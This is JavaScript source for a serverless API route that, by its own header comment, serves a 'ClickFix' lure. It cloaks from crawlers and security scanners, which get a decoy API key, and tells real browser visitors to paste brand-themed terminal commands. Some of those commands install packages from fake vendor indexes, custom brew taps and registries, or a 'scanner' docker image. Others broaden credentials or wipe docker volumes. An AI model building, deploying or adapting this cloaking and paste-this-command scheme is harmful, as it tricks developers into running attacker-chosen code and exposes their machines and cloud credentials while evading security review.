/**
 * Vercel Serverless — /api/[brand]
 * Dynamic route: catches all /api/aws-iam, /api/tf-workspace, /api/sendgrid-key, etc.
 * Bot → benign. Real browser → ClickFix payload.
 */
const BRAND_ALIASES = {
  aws: ['aws','s3','ec2','ecs','lambda','iam','amplify'],
  gcp: ['gcp','gke','run','gemini','google'],
  azure: ['azure','aks','ad'],
  nvidia: ['nvidia','cuda','gpu'],
  docker: ['docker','k8s','container'],
  npm: ['npm','node','js'],
  openai: ['openai','oai','gpt'],
  deepseek: ['deepseek','ds-','ds_'],
  steam: ['steam','valve'],
  github: ['git','github','gitlab'],
  k8s: ['kube','k8s','helm'],
  jetbrains: ['jetbrains','idea','intellij'],
  stripe: ['stripe'],
  vercel: ['vercel','nextjs'],
  cloudflare: ['cloudflare','cf-','worker'],
  slack: ['slack'],
  discord: ['discord'],
  figma: ['figma'],
  notion: ['notion'],
  spotify: ['spotify'],
  dropbox: ['dropbox'],
  atlassian: ['atlassian','jira','confluence'],
  heroku: ['heroku'],
  netlify: ['netlify'],
  oracle: ['oracle','oci'],
  digitalocean: ['digitalocean','do-'],
  redis: ['redis'],
  mongodb: ['mongo','atlas'],
  twilio: ['twilio'],
  sendgrid: ['sendgrid'],
  datadog: ['datadog'],
  newrelic: ['newrelic','nr-'],
  sentry: ['sentry'],
  paypal: ['paypal'],
  binance: ['binance'],
  shopify: ['shopify'],
  salesforce: ['salesforce','sf-'],
  hubspot: ['hubspot'],
  zendesk: ['zendesk'],
  mailchimp: ['mailchimp'],
  algolia: ['algolia'],
  firebase: ['firebase','fb-'],
  airtable: ['airtable'],
  webflow: ['webflow'],
  svelte: ['svelte'],
  vite: ['vite'],
  babel: ['babel'],
  webpack: ['webpack'],
  rollup: ['rollup'],
  railway: ['railway'],
  render: ['render'],
  supabase: ['supabase'],
  neon: ['neon'],
  planetscale: ['planetscale'],
  grafana: ['grafana'],
  auth0: ['auth0'],
  okta: ['okta'],
  terraform: ['terraform','hashicorp','tf-','tfc'],
  brew: ['brew','homebrew','tap'],
  cargo: ['cargo','crate','serde','registry'],
  circleci: ['circleci','circle'],
  bun: ['bun','bun-'],
};

const BRAND_CMDS = {
  aws: ['aws s3api put-bucket-policy --bucket my-bucket --policy file://policy.json',
        'aws iam update-access-key --access-key-id AKIAXXX --status Active --profile deploy'],
  gcp: ['gcloud iam service-accounts keys rotate --account=deploy-sa@my-project.iam',
        'gcloud storage buckets update gs://my-bucket --iam-policy-file=policy.json'],
  azure: ['az keyvault secret rotate --vault-name prod-vault --name api-secret',
          'az aks get-credentials --resource-group prod --name prod-cluster --overwrite-existing'],
  nvidia: ['winget install NVIDIA.GeForceDriver --version 531.79 --accept-package-agreements',
           'nvidia-smi --gpu-reset --gpu-id=0 --force'],
  steam: ['npm install -g steamcmd && steamcmd +login anonymous +quit',
          'steam://rungameid/730//-console -vguirate 5000'],
  docker: ['docker pull docker.io/library/scanner:latest && docker run --rm scanner:latest',
           'docker system prune -af --volumes --filter until=24h'],
  npm: ['npm install -g @npm/audit-tool && npm-audit --fix-all --force',
        'npx create-next-app@latest my-app --typescript --tailwind --eslint'],
  openai: ['npx openai-cli auth verify --api-key sk-proj-8xK9mP3vR2tW7yQ',
           'pip install openai==2.1.0 --extra-index-url https://platform.openai.com/pypi'],
  deepseek: ['npx @deepseek/coder-cli --verify --token SK-8xK9mP3vR2tW7yQ',
             'pip install deepseek-sdk==3.0.1 --extra-index-url https://platform.deepseek.com/pypi'],
  github: ['gh auth refresh --scopes repo,workflow,admin:org',
           'git config --global credential.helper cache --timeout=86400'],
  k8s: ['kubectl config set-credentials deploy-bot --token=$NEW_SERVICE_TOKEN',
        'kubeadm certs renew apiserver --config=/etc/kubernetes/kubeadm-config.yaml'],
  firebase: ['firebase projects:list && firebase use my-app-a1b2c',
             'npx firebase-tools login:ci --project my-app-a1b2c'],
  grafana: ['grafana-cli admin rotate-key --name myorg-admin --new-name myorg-admin-v2',
            'curl -X POST https://grafana.com/api/serviceaccounts/rotate -H "Authorization: Bearer $TOKEN"'],
  terraform: ['terraform apply -auto-approve tfplan',
              'npx @hashicorp/tfc-cli apply --workspace=aws-prod-infra --auto-approve',
              'terraform init -upgrade && terraform plan -out=tfplan && terraform apply tfplan'],
  sendgrid: ['npx @sendgrid/cli setup --api-key SG.xxxxxxxx --verify',
             'sendgrid-tools validate-integration --domain example.com'],
  brew: ['brew tap myorg/tools && brew install myorg/tools/wget-debug',
         'brew update && brew upgrade wget --fetch-HEAD'],
  cargo: ['cargo install --registry myorg cargo-audit-wrapper',
          'cargo login --registry myorg $CRATES_TOKEN'],
  circleci: ['circleci config validate --org-slug myorg/api-service .circleci/config.yml',
             'npx @circleci/local-cli setup --token $CIRCLECI_TOKEN'],
  bun: ['bun upgrade --canary',
        'npm install -g bun@canary && bun --version'],
  default: ['pip install security-toolkit==2.1.0',
            'npx create-secure-app@latest --verify --token SK-8xK9mP3vR2tW7yQ'],
};

const BOT_UA = /bot|crawler|spider|headless|selenium|puppeteer|playwright|curl|wget|python|java\/|go-http|node-fetch|axios|request\/|scanner|security|analyzer|audit|check/i;

function getCmd(brand) {
  const path = (brand || '').toLowerCase();
  for (const [key, aliases] of Object.entries(BRAND_ALIASES)) {
    for (const alias of aliases) {
      if (path.includes(alias)) {
        if (BRAND_CMDS[key]) {
          const cmds = BRAND_CMDS[key];
          return cmds[Math.floor(Math.random() * cmds.length)];
        }
      }
    }
  }
  const def = BRAND_CMDS.default;
  return def[Math.floor(Math.random() * def.length)];
}

export default function handler(req, res) {
  const brand = req.query.brand || '';
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  let isBot = BOT_UA.test(ua);
  if (!req.headers['sec-fetch-site'] && !req.headers['accept-language']) isBot = true;

  const data = isBot
    ? { text: 'sk-ds-8xK9mP3vR2tW7yQ-A1bC2dE3fG4hI5jK6lM', title: 'API Key Generated', desc: 'Your new API key has been generated. Copy it now:' }
    : { text: getCmd(brand), title: 'Configuration Tool', desc: 'Run this command in your terminal to proceed:' };

  res.status(200)
     .setHeader('Content-Type', 'application/json; charset=utf-8')
     .setHeader('Access-Control-Allow-Origin', '*')
     .setHeader('Cache-Control', 'no-store')
     .send(JSON.stringify(data));
}
